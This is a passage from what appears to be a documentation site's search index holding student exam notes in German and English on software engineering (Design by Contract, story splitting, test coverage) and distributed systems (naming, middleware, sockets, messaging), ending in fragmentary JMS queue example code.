\"ausserhalb\" pr\u00fcfen\n\n\n\n\n\n\n\n\nContracts und Vererbung\n\n\n\n\nEin Subtyp muss mindestens den Contract der Superklasse erf\u00fcllen\n\n\nWegen Liskov's Substitution Principle: Eine Superklasse muss austauschbar durch die Subklasse sein\n\n\n\n\n\n\nSubtypen d\u00fcrfen postconditons der Superklassen verst\u00e4rken (eingrenzen) und preconditions schw\u00e4chen (erweitern), aber nicht umgekehrt", 
            "title": "5 Design by Contract"
        }, 
        {
            "location": "/SE2/5_Design_by_Contract/#design-by-contract", 
            "text": "Contracts legen Rechte (benefits) und Pflichten (obligations) zwischen zweier Parteien in einem formalen Dokument fest  Design by Contract will dieses Prinzip auf SW anwenden  Beziehungn zwischen \"Kunden und Lieferanten\", zwischen zwei Komponenten, werden durch Vertr\u00e4ge geregelt  Komponenten k\u00f6nnen Systeme oder Subsysteme (z.B. Klassen) sein  Einf\u00fchrung Konzept von Eiffel", 
            "title": "Design by Contract"
        }, 
        {
            "location": "/SE2/5_Design_by_Contract/#pre-post-conditons", 
            "text": "Preconditions : Bedingungen, die vor dem Aufruf einer Methode gelten (bei Klasse). Der Aufrufer ist daf\u00fcr verantwortlich  Postconditions : Bedingungen, die nach dem Aufruf g\u00fcltig sind, verantwortlich ist die konkrete Implementation   Klasseninvarianten : Garantien f\u00fcr einen Aufrufer, welche Eigenschaften vor / nach jedem Methodenaufruf gelten   oder: Allgemeing\u00fcltige Postconditions f\u00fcr alle Methoden in einer Klasse     Pre- und Postconditions werden nur auf der \"supplier\"-Seite definiert, also dem \"Callee\"   Grund: Kontext des Aufrufers ist verschieden, beim Supplier aber immer gleich     In Eiffel werden Pre-conditions im  require -Block, Post-conditions im  ensure -Block definiert    Der defensive Ansatz pr\u00fcft die Pre-conditon in der Methode   Der Ansatz von  Design by contract  geht davon aus, dass die Pre- und Post-conditions  erf\u00fcllt  sind, ohne sie explizit zu pr\u00fcfen  Pre- und postconditions d\u00fcrfen Zust\u00e4nde des Systems abfragen, aber nicht ver\u00e4ndern!", 
            "title": "Pre-/Post-Conditons"
        }, 
        {
            "location": "/SE2/5_Design_by_Contract/#vollstandigkeit", 
            "text": "Man kann eine Klasse nur auf ihren internen Zustand pr\u00fcfen  Wenn z.B. eine Klasse eine Referenz auf eine andere Klasse hat, kann man nicht die internen Eigenschaften der Klasse \"ausserhalb\" pr\u00fcfen", 
            "title": "Vollst\u00e4ndigkeit"
        }, 
        {
            "location": "/SE2/5_Design_by_Contract/#contracts-und-vererbung", 
            "text": "Ein Subtyp muss mindestens den Contract der Superklasse erf\u00fcllen  Wegen Liskov's Substitution Principle: Eine Superklasse muss austauschbar durch die Subklasse sein    Subtypen d\u00fcrfen postconditons der Superklassen verst\u00e4rken (eingrenzen) und preconditions schw\u00e4chen (erweitern), aber nicht umgekehrt", 
            "title": "Contracts und Vererbung"
        }, 
        {
            "location": "/SE2/6_Story_Splitting/", 
            "text": "Story Splitting\n\n\nGrosse Projekte aufteilen\n\n\n\n\nWenn Projekt zu gross wird, gestaffelt Teile des Ganzen liefern\n\n\nAufteilung nach Kundendom\u00e4ne: Zuerst nur eine Teildom\u00e4ne des Kunden realisieren\n\n\nAufteilung nach Prozessen: Ein Prozess kann meist gut in UCs \u00fcbertragen werden. Diese k\u00f6nnen nacheinander ausgeliefert werden\n\n\nKernfunktionalit\u00e4t zuerts implementieren, CRUD erst sp\u00e4ter, da diese gut gefaked werden k\u00f6nnen\n\n\n\n\n\n\nAufteilung nach Rollen: Rollen werden priorisiert und nach dieser Reihenfolge auch die UCs\n\n\nAufteilung nach Domain Modell: Gruppieren und priorisieren\n\n\nGeografisch aufteilen: Zuerst in kleinem Rahmen austeilen, dann f\u00fcr stetig gr\u00f6sseren\n\n\n\n\nGrosse Arbeitspakete aufteilen\n\n\n\n\nZuerst primitive Version implementieren, dann Schritt f\u00fcr Schritt \"vergolden\"\n\n\nIn einem Sprint ist ca. 60%-70% der Arbeitszeit produktiv\n\n\nDaher ideale Gr\u00f6sse: 50%-70% pro Arbeitspaket, damit eine Person in einem Sprint sicher fertig wird\n\n\nEpics sind ungef\u00e4hr UCs, die aufgeteilt werden in User Stories (= Arbeitspakete)\n\n\nUser Stories sind urspr\u00fcnglich von der Form \"as a .. I want to ...\", aber das ist kundenorientiert\n\n\nIn der Implementierung braucht es anwendungsorientierte User Stories (=Arbeitspakete)", 
            "title": "6 Story Splitting"
        }, 
        {
            "location": "/SE2/6_Story_Splitting/#story-splitting", 
            "text": "", 
            "title": "Story Splitting"
        }, 
        {
            "location": "/SE2/6_Story_Splitting/#grosse-projekte-aufteilen", 
            "text": "Wenn Projekt zu gross wird, gestaffelt Teile des Ganzen liefern  Aufteilung nach Kundendom\u00e4ne: Zuerst nur eine Teildom\u00e4ne des Kunden realisieren  Aufteilung nach Prozessen: Ein Prozess kann meist gut in UCs \u00fcbertragen werden. Diese k\u00f6nnen nacheinander ausgeliefert werden  Kernfunktionalit\u00e4t zuerts implementieren, CRUD erst sp\u00e4ter, da diese gut gefaked werden k\u00f6nnen    Aufteilung nach Rollen: Rollen werden priorisiert und nach dieser Reihenfolge auch die UCs  Aufteilung nach Domain Modell: Gruppieren und priorisieren  Geografisch aufteilen: Zuerst in kleinem Rahmen austeilen, dann f\u00fcr stetig gr\u00f6sseren", 
            "title": "Grosse Projekte aufteilen"
        }, 
        {
            "location": "/SE2/6_Story_Splitting/#grosse-arbeitspakete-aufteilen", 
            "text": "Zuerst primitive Version implementieren, dann Schritt f\u00fcr Schritt \"vergolden\"  In einem Sprint ist ca. 60%-70% der Arbeitszeit produktiv  Daher ideale Gr\u00f6sse: 50%-70% pro Arbeitspaket, damit eine Person in einem Sprint sicher fertig wird  Epics sind ungef\u00e4hr UCs, die aufgeteilt werden in User Stories (= Arbeitspakete)  User Stories sind urspr\u00fcnglich von der Form \"as a .. I want to ...\", aber das ist kundenorientiert  In der Implementierung braucht es anwendungsorientierte User Stories (=Arbeitspakete)", 
            "title": "Grosse Arbeitspakete aufteilen"
        }, 
        {
            "location": "/SE2/7_Testing/", 
            "text": "Testing in gr\u00f6sseren Projekten\n\n\nMicrotesting\n\n\n\n\nJe weiter oben im Layer, desto mehr muss gemockt / gefaked werden\n\n\nTesten einzelne Teile in Isolation -\n Gegensatz zu Integrationtests!\n\n\n\n\nIntegration-Test\n\n\n\n\nM\u00f6glichst hoch oben in den Layers\n\n\nUnit-Tests!\n\n\nSind in der Regel die \"besseren Tests\" als Microtests, weil sie realistischere Szenarien testen\n\n\nGeht wom\u00f6glich durch alle Schichten durch, ohne Mocking\n\n\nIm Exambiur z.B. auf Ebene Service\n\n\nK\u00f6nnen Teil der Ent-to-End-Tests ersetzen, dort muss dann nur noch die Darstellung getestet werden, nicht die Logik\n\n\nFramework: \nhttps://cucumber.io/\n\n\n\n\n\"Lokales Minimum\"-Effekt\n\n\n\n\nWenn viele Unit-Tests vorhanden sind, verleitet es zu weniger \"grobem\" Refactoring, da dadurch die Unit-Tests kaputt gehen\n\n\nMan versucht nur, lokal zu optimieren, anstatt Architektur zu refactoren, und sieht die \"grosse\" L\u00f6sung nicht\n\n\n\n\nWann haben wir genug getestet?\n\n\n\n\nKeine der Antworten sagt viel aus\n\n\nAber was denn sonst?\n\n\nKonnt stark auf den Kontext an: Ist es ein medizinisches System, oder nur eine simple Website?\n\n\n\n\nTestabdeckung\n\n\nStatement Coverage\n\n\n\n\nTest Coverage Tools messen nur Statement-Abdeckung, welcher Anteil aller Statements wurden von einem Test durchlaufen?\n\n\nStatement-Abeckung ist einfach zu ermitteln, aber die wenigst aussagekr\u00e4ftige\n\n\n\n\nBranch Coverage\n\n\n\n\nJedes \nIf\n ergibt 2 Zweige: Eine f\u00fcr Condition erf\u00fcllt und eine f\u00fcr \nelse\n\n\nBranch Coverage (Zweigabdeckung) z\u00e4hlt die Anzahl abgedeckten Zweige / Gesamtzahl der Zweige\n\n\nBei Loops und Ifs auch testen, wenn Body gar nie ausgef\u00fchrt wird\n\n\nFehlerquellen, wenn im Zweig Seiteneffekte entstehen\n\n\n\n\n\n\n\n\nDecision Coverage\n\n\n\n\nBedinungsabdeckung pr\u00fcft, welche Entscheidungen einmal auf \ntrue\n und eimal auf \nfalse\n getestet wurden\n\n\nBei \nIf\ns und Loops mit mehreren Bedingungen gibt es entsprechend f\u00fcr jede Bedingung zwei Tests\n\n\n\n\nPath Coverage\n\n\n\n\nAlle m\u00f6glichen Kombinationen von Pfaden im Zweig-Graphen\n\n\nF\u00fchrt schnell zu unendliche Anzahl Kombinationen!\n\n\n\n\nServer Setup\n\n\n\n\nTEST: Test-Server f\u00fcr Entwickler, auch z.B. f\u00fcr Performance-Tests\n\n\nACC: Acceptance-Server / Staging Server  f\u00fcr Kunden zum Ausprobieren", 
            "title": "7 Testing"
        }, 
        {
            "location": "/SE2/7_Testing/#testing-in-grosseren-projekten", 
            "text": "", 
            "title": "Testing in gr\u00f6sseren Projekten"
        }, 
        {
            "location": "/SE2/7_Testing/#microtesting", 
            "text": "Je weiter oben im Layer, desto mehr muss gemockt / gefaked werden  Testen einzelne Teile in Isolation -  Gegensatz zu Integrationtests!", 
            "title": "Microtesting"
        }, 
        {
            "location": "/SE2/7_Testing/#integration-test", 
            "text": "M\u00f6glichst hoch oben in den Layers  Unit-Tests!  Sind in der Regel die \"besseren Tests\" als Microtests, weil sie realistischere Szenarien testen  Geht wom\u00f6glich durch alle Schichten durch, ohne Mocking  Im Exambiur z.B. auf Ebene Service  K\u00f6nnen Teil der Ent-to-End-Tests ersetzen, dort muss dann nur noch die Darstellung getestet werden, nicht die Logik  Framework:  https://cucumber.io/", 
            "title": "Integration-Test"
        }, 
        {
            "location": "/SE2/7_Testing/#lokales-minimum-effekt", 
            "text": "Wenn viele Unit-Tests vorhanden sind, verleitet es zu weniger \"grobem\" Refactoring, da dadurch die Unit-Tests kaputt gehen  Man versucht nur, lokal zu optimieren, anstatt Architektur zu refactoren, und sieht die \"grosse\" L\u00f6sung nicht", 
            "title": "\"Lokales Minimum\"-Effekt"
        }, 
        {
            "location": "/SE2/7_Testing/#wann-haben-wir-genug-getestet", 
            "text": "Keine der Antworten sagt viel aus  Aber was denn sonst?  Konnt stark auf den Kontext an: Ist es ein medizinisches System, oder nur eine simple Website?", 
            "title": "Wann haben wir genug getestet?"
        }, 
        {
            "location": "/SE2/7_Testing/#testabdeckung", 
            "text": "", 
            "title": "Testabdeckung"
        }, 
        {
            "location": "/SE2/7_Testing/#statement-coverage", 
            "text": "Test Coverage Tools messen nur Statement-Abdeckung, welcher Anteil aller Statements wurden von einem Test durchlaufen?  Statement-Abeckung ist einfach zu ermitteln, aber die wenigst aussagekr\u00e4ftige", 
            "title": "Statement Coverage"
        }, 
        {
            "location": "/SE2/7_Testing/#branch-coverage", 
            "text": "Jedes  If  ergibt 2 Zweige: Eine f\u00fcr Condition erf\u00fcllt und eine f\u00fcr  else  Branch Coverage (Zweigabdeckung) z\u00e4hlt die Anzahl abgedeckten Zweige / Gesamtzahl der Zweige  Bei Loops und Ifs auch testen, wenn Body gar nie ausgef\u00fchrt wird  Fehlerquellen, wenn im Zweig Seiteneffekte entstehen", 
            "title": "Branch Coverage"
        }, 
        {
            "location": "/SE2/7_Testing/#decision-coverage", 
            "text": "Bedinungsabdeckung pr\u00fcft, welche Entscheidungen einmal auf  true  und eimal auf  false  getestet wurden  Bei  If s und Loops mit mehreren Bedingungen gibt es entsprechend f\u00fcr jede Bedingung zwei Tests", 
            "title": "Decision Coverage"
        }, 
        {
            "location": "/SE2/7_Testing/#path-coverage", 
            "text": "Alle m\u00f6glichen Kombinationen von Pfaden im Zweig-Graphen  F\u00fchrt schnell zu unendliche Anzahl Kombinationen!", 
            "title": "Path Coverage"
        }, 
        {
            "location": "/SE2/7_Testing/#server-setup", 
            "text": "TEST: Test-Server f\u00fcr Entwickler, auch z.B. f\u00fcr Performance-Tests  ACC: Acceptance-Server / Staging Server  f\u00fcr Kunden zum Ausprobieren", 
            "title": "Server Setup"
        }, 
        {
            "location": "/SE2/8_Metriken/", 
            "text": "Metriken", 
            "title": "8 Metriken"
        }, 
        {
            "location": "/SE2/8_Metriken/#metriken", 
            "text": "", 
            "title": "Metriken"
        }, 
        {
            "location": "/Vss/0_Index/", 
            "text": "Verteilte Software-Systeme\n\n\n\n\nExam Notes\n\n\nIntroduction\n\n\nSocket Programmierung\n\n\nAsynchronous Messaging\n\n\nRMI and Web-Services\n\n\nDesign for Performance", 
            "title": "0 Index"
        }, 
        {
            "location": "/Vss/0_Index/#verteilte-software-systeme", 
            "text": "Exam Notes  Introduction  Socket Programmierung  Asynchronous Messaging  RMI and Web-Services  Design for Performance", 
            "title": "Verteilte Software-Systeme"
        }, 
        {
            "location": "/Vss/10_Naming/", 
            "text": "Naming\n\n\n\n\nName things to find Resources that interest me\n\n\nAssign names to entities to identify them, e.g. assign phone numbers to customers\n\n\nName Resolution is the problem of accessing a resource using a name\n\n\n\n\nNaming in a Distributed System\n\n\n\n\ne.g. processes on a single computer\n\n\na centralized name resolution for the telephone system would be a single phonebook in existence\n\n\nnot robust (what if you lose it?)\n\n\nnot scalable\n\n\nhigh \"network latency\"\n\n\n\n\n\n\nPossible Solution: Hand everyone a copy -\n Distributed Name Resolution System\n\n\n\n\nTerminology\n\n\n\n\nNormally, each entity (e.g. a person) has an access point (e.g. a phone) through which the entity can be accessed\n\n\nName\n: String to identify an entity\n\n\nEntity\n: Physical or logical object\n\n\nAccess Point\n: Entity that is used to access another entity\n\n\nOften given through physical connection, e.g. a customers owns his phone\n\n\n\n\n\n\nAddress\n: Name of an Access Point\n\n\noften defined at another level, e.g. a MAC-Adress to a NIC\n\n\n\n\n\n\nAdvantages\n\n\nVery flexible: Adress and access points can change, but it is still accessible through it's name\n\n\nEntity can listen to multiple access points\n\n\n\n\n\n\nLocation Independent Name\n: Name is independent of address\n\n\n\n\nNaming Overview\n\n\nFlat Naming\n\n\n\n\nNames are unstructured identifiers\n\n\nNames may have internal structure, but it's not used in name resolution (e.g. IP-Adress)\n\n\nUsed with broadcasting\n\n\nEvery entity knows it's (flat) name and address\n\n\nResolution is done with broadcasting: \"Where is X?\" - X answers with his address\n\n\n\n\n\n\nUsed in ARP\n\n\nPros\n\n\nSimplicity\n\n\nLocation independent\n\n\n\n\n\n\nCons\n\n\nNot scalable, e.g. wouldn't work for a phone system\n\n\nEasy to impersonate someone else\n\n\n\n\n\n\n\n\nStructured Naming\n\n\n\n\nNames are hierarchical structured\n\n\nName represents a path in a tree, e.g. \nunterricht.hsr.ch\n\n\nResolution is split into sepparate layers with different responsibilities\n\n\ne.g. DNS\n\n\nHighly scalable\n\n\n\n\nAttribute-based Naming", 
            "title": "10 Naming"
        }, 
        {
            "location": "/Vss/10_Naming/#naming", 
            "text": "Name things to find Resources that interest me  Assign names to entities to identify them, e.g. assign phone numbers to customers  Name Resolution is the problem of accessing a resource using a name", 
            "title": "Naming"
        }, 
        {
            "location": "/Vss/10_Naming/#naming-in-a-distributed-system", 
            "text": "e.g. processes on a single computer  a centralized name resolution for the telephone system would be a single phonebook in existence  not robust (what if you lose it?)  not scalable  high \"network latency\"    Possible Solution: Hand everyone a copy -  Distributed Name Resolution System", 
            "title": "Naming in a Distributed System"
        }, 
        {
            "location": "/Vss/10_Naming/#terminology", 
            "text": "Normally, each entity (e.g. a person) has an access point (e.g. a phone) through which the entity can be accessed  Name : String to identify an entity  Entity : Physical or logical object  Access Point : Entity that is used to access another entity  Often given through physical connection, e.g. a customers owns his phone    Address : Name of an Access Point  often defined at another level, e.g. a MAC-Adress to a NIC    Advantages  Very flexible: Adress and access points can change, but it is still accessible through it's name  Entity can listen to multiple access points    Location Independent Name : Name is independent of address", 
            "title": "Terminology"
        }, 
        {
            "location": "/Vss/10_Naming/#naming-overview", 
            "text": "", 
            "title": "Naming Overview"
        }, 
        {
            "location": "/Vss/10_Naming/#flat-naming", 
            "text": "Names are unstructured identifiers  Names may have internal structure, but it's not used in name resolution (e.g. IP-Adress)  Used with broadcasting  Every entity knows it's (flat) name and address  Resolution is done with broadcasting: \"Where is X?\" - X answers with his address    Used in ARP  Pros  Simplicity  Location independent    Cons  Not scalable, e.g. wouldn't work for a phone system  Easy to impersonate someone else", 
            "title": "Flat Naming"
        }, 
        {
            "location": "/Vss/10_Naming/#structured-naming", 
            "text": "Names are hierarchical structured  Name represents a path in a tree, e.g.  unterricht.hsr.ch  Resolution is split into sepparate layers with different responsibilities  e.g. DNS  Highly scalable", 
            "title": "Structured Naming"
        }, 
        {
            "location": "/Vss/10_Naming/#attribute-based-naming", 
            "text": "", 
            "title": "Attribute-based Naming"
        }, 
        {
            "location": "/Vss/1_Exam/", 
            "text": "Exam\n\n\nHilfsmittel\n\n\n\n\n2 A4-Seiten Zusammenfassung", 
            "title": "1 Exam"
        }, 
        {
            "location": "/Vss/1_Exam/#exam", 
            "text": "", 
            "title": "Exam"
        }, 
        {
            "location": "/Vss/1_Exam/#hilfsmittel", 
            "text": "2 A4-Seiten Zusammenfassung", 
            "title": "Hilfsmittel"
        }, 
        {
            "location": "/Vss/2_Introduction/", 
            "text": "Introduction\n\n\n\n\nTransparency Types: Eigenschaften eines Systems transparent (= \"durchsichtig\") f\u00fcr den Benutzer machen, damit er nicht mitbekommt, dass z.B. mehrere Benutzer gleichzeitig zugreifen (Concurrency Transparency)\n\n\nVorteile von VSS\n\n\nBilden die verteilte Realit\u00e4t ab (verschiedene Arbeitspl\u00e4tze etc.)\n\n\nPerformancesteigerung (paralelle Verarbeitung)\n\n\nSkalierbarkeit\n\n\nFehlertoleranz\n\n\n\n\n\n\nHerausforderungen VSS\n\n\nKomplexe Kommunikation\n\n\nPerformanceprobleme (Latenz, Durchsatz)\n\n\nZuverl\u00e4ssigkeit (Netzzugriffe, Ausf\u00e4lle)\n\n\nTransaktionssicherheit (mehrere Benutzer)\n\n\n\n\n\n\n\n\nMiddleware\n\n\nMidleware\n ist infrastrukturelle Software, die eine Ebene unter dem Software-System liegt\n\n\n\n\nWird i.d.R. nicht selbst geschrieben\n\n\nDient zur Kommunikation zwischen den Software-Komponenten\n\n\n\n\nKommunikationsmiddleware\n\n\n\n\nInterfaces zur Netzwerkprogrammierung\n\n\nTCP/IP Sockets, RESTful HTTP, etc.\n\n\n\n\nAnwedungsorientierte Middleware\n\n\n\n\nHigh-level Protokolle\n\n\nUnterst\u00fctzung verteiler Andwendungen\n\n\nVereinfacht das Design der Applikation\n\n\nbietet Sicherheit, Zuverl\u00e4ssigkeit, verteilte Transaktionen, ...\n\n\nz.B. .NET Application Server, SQL mit Remote Queries, ...\n\n\n\n\n\n\nVSS Architectural Styles\n\n\n\n\n\n\n\n\nHub and Spoke\n: Alle kommunizieren \u00fcber zentrale Stelle (\"Hub\")\n\n\n\n\n\n\nCORBA (Centralized Object Request Broker Architecture) wird heute nicht mehr verwendet, die Prinzipien sind aber immer noch releveant\n\n\n\n\n\n\nIdempotenz\n\n\n\n\nIdempotente Funktion: z.B. zwei Zahlen addieren, Funktion macht bei jedem gleichen Aufruf das selbe\n\n\nNicht-idempotente Funktion: Es wird ein Zustand ver\u00e4ndert, bei zweitem gleichen Aufruf ist das Verhalten anders. z.B. Lagerstand \u00e4ndern, Konto-\u00dcbertrag\n\n\nServer idempotent machen: Designfrage, z.B. jede Nachricht mit eindeutiger ID versehen, Server darf diese ID nur einmal bearbeiten", 
            "title": "2 Introduction"
        }, 
        {
            "location": "/Vss/2_Introduction/#introduction", 
            "text": "Transparency Types: Eigenschaften eines Systems transparent (= \"durchsichtig\") f\u00fcr den Benutzer machen, damit er nicht mitbekommt, dass z.B. mehrere Benutzer gleichzeitig zugreifen (Concurrency Transparency)  Vorteile von VSS  Bilden die verteilte Realit\u00e4t ab (verschiedene Arbeitspl\u00e4tze etc.)  Performancesteigerung (paralelle Verarbeitung)  Skalierbarkeit  Fehlertoleranz    Herausforderungen VSS  Komplexe Kommunikation  Performanceprobleme (Latenz, Durchsatz)  Zuverl\u00e4ssigkeit (Netzzugriffe, Ausf\u00e4lle)  Transaktionssicherheit (mehrere Benutzer)", 
            "title": "Introduction"
        }, 
        {
            "location": "/Vss/2_Introduction/#middleware", 
            "text": "Midleware  ist infrastrukturelle Software, die eine Ebene unter dem Software-System liegt   Wird i.d.R. nicht selbst geschrieben  Dient zur Kommunikation zwischen den Software-Komponenten", 
            "title": "Middleware"
        }, 
        {
            "location": "/Vss/2_Introduction/#kommunikationsmiddleware", 
            "text": "Interfaces zur Netzwerkprogrammierung  TCP/IP Sockets, RESTful HTTP, etc.", 
            "title": "Kommunikationsmiddleware"
        }, 
        {
            "location": "/Vss/2_Introduction/#anwedungsorientierte-middleware", 
            "text": "High-level Protokolle  Unterst\u00fctzung verteiler Andwendungen  Vereinfacht das Design der Applikation  bietet Sicherheit, Zuverl\u00e4ssigkeit, verteilte Transaktionen, ...  z.B. .NET Application Server, SQL mit Remote Queries, ...", 
            "title": "Anwedungsorientierte Middleware"
        }, 
        {
            "location": "/Vss/2_Introduction/#vss-architectural-styles", 
            "text": "Hub and Spoke : Alle kommunizieren \u00fcber zentrale Stelle (\"Hub\")    CORBA (Centralized Object Request Broker Architecture) wird heute nicht mehr verwendet, die Prinzipien sind aber immer noch releveant", 
            "title": "VSS Architectural Styles"
        }, 
        {
            "location": "/Vss/2_Introduction/#idempotenz", 
            "text": "Idempotente Funktion: z.B. zwei Zahlen addieren, Funktion macht bei jedem gleichen Aufruf das selbe  Nicht-idempotente Funktion: Es wird ein Zustand ver\u00e4ndert, bei zweitem gleichen Aufruf ist das Verhalten anders. z.B. Lagerstand \u00e4ndern, Konto-\u00dcbertrag  Server idempotent machen: Designfrage, z.B. jede Nachricht mit eindeutiger ID versehen, Server darf diese ID nur einmal bearbeiten", 
            "title": "Idempotenz"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/", 
            "text": "Socket Programmierung\n\n\n\n\nMessage-Oriented Middleware (z.B. HTTP GET / POST)\n\n\nClient wartet meist asynchron auf die Antwort\n\n\n\n\n\n\nRemote Procedure Call\n\n\nz.B. JAVA RMI\n\n\nHeute Web-Services (RESTful HTTP)\n\n\nClient wartet auf die Antwort\n\n\n\n\n\n\nFallacies of Distributed Systems\n\n\nFowler's First Law\n of Distributed Object Design\n\n\nVerteilte eigene Objekte sind starke Kopplung!\n\n\nM\u00fcssen meist in gleicher Sprache sein\n\n\n\n\n\n\n\n\nSockets\n\n\n\n\nMiddleware, um \u00fcber TCP / UDP zu kommunizieren\n\n\nZwei Prozesse schreiben und lesen auf den Socket, als ob es ein File w\u00e4re\n\n\nIdentifiziert durch Tupel IP-Adresse und Port\n\n\nZuerst muss Session aufgebaut werden\n\n\nEnge Kopplung zwischen Client und Server\n\n\nIn TCP/IP-Model auf Application-Layer, in OSI-Modell auf Session-Layer\n\n\nNachteile\n\n\nReiner Bytestream - Muss geparsed werden\n\n\nMessage Exchange Patterns muss selbst implementiert werden, z.B. Reihenfolge der Messages\n\n\n\n\n\n\nMeist nicht direkt auf Sockets programmieren, sondern h\u00f6here Abstraktion verwenden\n\n\n\n\nServer\n\n\n\n\nH\u00f6rt auf einen Port (Listener)\n\n\nErstellt f\u00fcr jeden Client einen eigenen Socket\n\n\n\n\nMeist wird f\u00fcr jede Client-Connection (Socket) ein eigener Thread verwendet\n\n\n\n\n\n\nBerkeley Sockets bieten ein standardisiertes Interface\n\n\n\n\n\n\nWebSockets\n\n\n\n\nBei reinem HTTP kann der Server nur Daten senden, wenn der Client eine Anfrage sendet\n\n\nMit Websockets kann der Server Daten auf den Client \"pushen\"\n\n\nBrowser sendet Daten mit \nsend()\n und empf\u00e4ngt Daten in \nonmessage\n Event handler\n\n\nWird von modernen Browsern unterst\u00fctzt\n\n\n\n\nUDP-Sockets\n\n\n\n\nClient muss keine Verbindung vor dem Senden zum Server aufbauen, sondern kann direkt anfangen zu senden\n\n\nServer sendet keine Best\u00e4tigung\n\n\nJava Tutorial\n\n\n\n\nMessaging Patterns\n\n\n\n\nBasic Pattern\n: Analog zu einem Brief, der von einem Message Endpoint zum anderen gesendet wird\n\n\nBlocking Receiver Message Pattern\n: Synchrone \u00dcbertragung, Server und Client warten auf die Antwort\n\n\nPolling Receiver Message Pattern\n: Der Receiver macht Anfragen zum Empfangen der Nachricht (Polling)\n\n\nService Activator Message Pattern\n: Auf einen Request ruft der \"Replier\" mit dem \"Service Activator\" die richtige Service-Funktion auf (RPC-style)", 
            "title": "3 socket programmierung"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#socket-programmierung", 
            "text": "Message-Oriented Middleware (z.B. HTTP GET / POST)  Client wartet meist asynchron auf die Antwort    Remote Procedure Call  z.B. JAVA RMI  Heute Web-Services (RESTful HTTP)  Client wartet auf die Antwort    Fallacies of Distributed Systems  Fowler's First Law  of Distributed Object Design  Verteilte eigene Objekte sind starke Kopplung!  M\u00fcssen meist in gleicher Sprache sein", 
            "title": "Socket Programmierung"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#sockets", 
            "text": "Middleware, um \u00fcber TCP / UDP zu kommunizieren  Zwei Prozesse schreiben und lesen auf den Socket, als ob es ein File w\u00e4re  Identifiziert durch Tupel IP-Adresse und Port  Zuerst muss Session aufgebaut werden  Enge Kopplung zwischen Client und Server  In TCP/IP-Model auf Application-Layer, in OSI-Modell auf Session-Layer  Nachteile  Reiner Bytestream - Muss geparsed werden  Message Exchange Patterns muss selbst implementiert werden, z.B. Reihenfolge der Messages    Meist nicht direkt auf Sockets programmieren, sondern h\u00f6here Abstraktion verwenden", 
            "title": "Sockets"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#server", 
            "text": "H\u00f6rt auf einen Port (Listener)  Erstellt f\u00fcr jeden Client einen eigenen Socket   Meist wird f\u00fcr jede Client-Connection (Socket) ein eigener Thread verwendet    Berkeley Sockets bieten ein standardisiertes Interface", 
            "title": "Server"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#websockets", 
            "text": "Bei reinem HTTP kann der Server nur Daten senden, wenn der Client eine Anfrage sendet  Mit Websockets kann der Server Daten auf den Client \"pushen\"  Browser sendet Daten mit  send()  und empf\u00e4ngt Daten in  onmessage  Event handler  Wird von modernen Browsern unterst\u00fctzt", 
            "title": "WebSockets"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#udp-sockets", 
            "text": "Client muss keine Verbindung vor dem Senden zum Server aufbauen, sondern kann direkt anfangen zu senden  Server sendet keine Best\u00e4tigung  Java Tutorial", 
            "title": "UDP-Sockets"
        }, 
        {
            "location": "/Vss/3_socket_programmierung/#messaging-patterns", 
            "text": "Basic Pattern : Analog zu einem Brief, der von einem Message Endpoint zum anderen gesendet wird  Blocking Receiver Message Pattern : Synchrone \u00dcbertragung, Server und Client warten auf die Antwort  Polling Receiver Message Pattern : Der Receiver macht Anfragen zum Empfangen der Nachricht (Polling)  Service Activator Message Pattern : Auf einen Request ruft der \"Replier\" mit dem \"Service Activator\" die richtige Service-Funktion auf (RPC-style)", 
            "title": "Messaging Patterns"
        }, 
        {
            "location": "/Vss/4_Asynchronous_Messaging/", 
            "text": "Asynchronous Messaging\n\n\nZiel\n\n\n\n\nLose Kopplung zum Austausch von Nachrichten auf unterschiedlichen Plattformen in unterschiedlichen Formaten\n\n\nSkalierbarkeit, Fehlertoleranz, Erweiterbarkeit\n\n\nViele Design-Entscheidungen, z.B. QoS Eigenschaften\n\n\n\n\nEinf\u00fchrung Messaging\n\n\n\n\nEine Message besteht aus Message Descriptor und Message Data\n\n\nDer Queue Manager ist verantwortlich f\u00fcr das Versenden und Empfangen von Nachrichten\n\n\nBei Asynchronous RPC antwortet der Server zwei Mal\n\n\nDas erste Mal als Best\u00e4tigung der Ausf\u00fchrung (Accept Request)\n\n\nDas zweite Mal mit dem Resultat\n\n\n\n\n\n\n\n\nMessaging Middleware\n\n\n\n\nz.B. IBM MQ, Microsoft MQ, ActiveMQ (Apache)\n\n\n\n\nJava Message Service (JMS) API\n\n\n\n\nGrundlegende MOM API\n\n\nPut\n: Append a message to the queue\n\n\nGet\n: Block until queue ist not empty, then remove first message\n\n\nPoll\n: Remove first entry if queue is not empty, never block\n\n\nNotify\n: Install a handler to be notified when a message is put into the queue\n\n\n\n\n\n\nMessage Reliability Levels\n\n\nEine JMS Message besteht aus Header, Properties und Body\n\n\nProperties sind Erweiterungen des Standard-headers und optional\n\n\n\n\n\n\n\n\nBeispiel Queue Sender (Message Producer)\n\n\nConnection\n \nconnection\n \n=\n \nconnectionFactory\n.\ncreateConnection\n();\n\n\nconnection\n.\nstart\n();\n\n\nSession\n \nsession\n \n=\n \nconnection\n.\ncreateSession\n(\nmp\n.\ntransacted\n,\n\n    \nSession\n.\nAUTO_ACKNOWLEDGE\n);\n\n\nDestination\n \ndestination\n \n=\n \nsession\n.\ncreateQueue\n(\ntestQueue\n);\n\n\nMessageProducer\n \nproducer\n \n=\n \nsession\n.\ncreateProducer\n(\ndestination\n);\n\n\nproducer\n.\nsetDeliveryMode\n(\nDeliveryMode\n.\nPERSISTENT\n);\n\n\nTextMessage\n \nmessage\n \n=\n \nsession\n.\ncreateTextMessage\n(\nhello\n);\n\n\nproducer\n.\nsend\n(\nmessage\n);\n\n\nproducer\n.\nclose\n();\n\n\nsession\n.\nclose\n();\n\n\nconnection\n.\nclose\n();\n\n\n\n\n\n\nBeispiel Queue Receiver (Message Consumer)\n\n\nConnection\n \nconnection\n \n=\n \nconnectionFactory\n.\ncreateConnection\n();\n\n\nconnection\n.\nstart\n();\n\n\nSession\n \nsession\n \n=\n \nconnection\n.\ncreateSession\n(\nmc\n.\ntransacted\n,\n\n    \nSession\n.\nAUTO_ACKNOWLEDGE\n);\n\n\nDestination\n \ndestination\n \n=\n 